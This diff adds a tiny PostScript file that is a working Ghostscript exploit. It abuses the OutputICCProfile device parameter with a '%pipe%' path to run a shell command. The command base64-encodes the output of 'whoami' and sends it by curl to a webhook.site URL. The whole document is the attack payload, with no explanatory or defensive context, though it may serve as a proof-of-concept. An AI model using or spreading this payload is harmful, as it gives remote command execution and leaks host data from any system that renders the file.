@@ -1,0 +1,4 @@
+%!PS
+currentdevice null true mark /OutputICCProfile (%pipe%curl https://webhook.site/b5e60082-cf74-4aef-8560-d7ec345da2b5/?a=$(whoami|base64) )
+.putdeviceparams
+quit
